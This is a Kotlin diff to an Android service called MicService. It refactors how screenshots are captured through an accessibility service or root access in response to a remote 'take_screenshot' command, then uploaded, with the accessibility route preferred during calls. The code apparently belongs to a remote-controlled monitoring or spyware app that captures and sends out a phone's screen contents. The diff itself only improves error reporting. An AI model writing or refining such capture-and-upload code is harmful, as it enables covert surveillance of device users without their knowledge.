@@ -2329,11 +2329,11 @@ class MicService : Service() {
 
             try {
                 val preferAccessibility = isDeviceInCall() || isCapturing
-                val screenshotBytes = captureScreenshotBytes(preferAccessibility)
+                val (screenshotBytes, captureErr) = captureScreenshotBytes(preferAccessibility)
                 if (screenshotBytes != null) {
                     uploadScreenshotBytes(screenshotBytes)
                 } else {
-                    val reason = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) "unsupported_android_version" else "capture_failed"
+                    val reason = captureErr ?: "capture_failed"
                     sendCommandAck("take_screenshot", "error", reason)
                 }
             } catch (e: Exception) {
@@ -2348,34 +2348,40 @@ class MicService : Service() {
         }
     }
 
-    private suspend fun captureScreenshotBytes(preferAccessibility: Boolean): ByteArray? {
+    private suspend fun captureScreenshotBytes(preferAccessibility: Boolean): Pair<ByteArray?, String?> {
         if (preferAccessibility) {
-            captureAccessibilityScreenshotBytes()?.let { return it }
-            captureRootScreenshotBytes(1_500L)?.let { return optimizeScreenshotJpeg(it) }
-            return null
+            val (accBytes, accErr) = captureAccessibilityScreenshotBytes()
+            if (accBytes != null) return Pair(accBytes, null)
+            captureRootScreenshotBytes(1_500L)?.let { return Pair(optimizeScreenshotJpeg(it), null) }
+            return Pair(null, accErr)
         }
-        captureRootScreenshotBytes(2_500L)?.let { return optimizeScreenshotJpeg(it) }
+        captureRootScreenshotBytes(2_500L)?.let { return Pair(optimizeScreenshotJpeg(it), null) }
         return captureAccessibilityScreenshotBytes()
     }
 
-    private suspend fun captureAccessibilityScreenshotBytes(): ByteArray? {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
-        val accessibilityInstance = MonitorAccessibilityService.instance ?: return null
+    private suspend fun captureAccessibilityScreenshotBytes(): Pair<ByteArray?, String?> {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return Pair(null, "unsupported_android_version")
+        val accessibilityInstance = MonitorAccessibilityService.instance ?: return Pair(null, "accessibility_disabled")
         return withTimeoutOrNull(4_000L) {
-            val result = CompletableDeferred<ByteArray?>()
-            accessibilityInstance.captureScreen { bitmap ->
+            val result = CompletableDeferred<Pair<ByteArray?, String?>>()
+            accessibilityInstance.captureScreen { (bitmap, err) ->
                 serviceScope.launch(Dispatchers.Default) {
-                    result.complete(bitmap?.let { bmp ->
+                    if (bitmap != null) {
                         try {
-                            optimizeScreenshotBitmap(bmp)
+                            val optimized = optimizeScreenshotBitmap(bitmap)
+                            result.complete(Pair(optimized, null))
+                        } catch (e: Exception) {
+                            result.complete(Pair(null, "optimize_failed"))
                         } finally {
-                            if (!bmp.isRecycled) bmp.recycle()
+                            if (!bitmap.isRecycled) bitmap.recycle()
                         }
-                    })
+                    } else {
+                        result.complete(Pair(null, err ?: "unknown_capture_error"))
+                    }
                 }
             }
             result.await()
-        }
+        } ?: Pair(null, "timeout")
     }
 
     private suspend fun captureRootScreenshotBytes(timeoutMs: Long): ByteArray? {
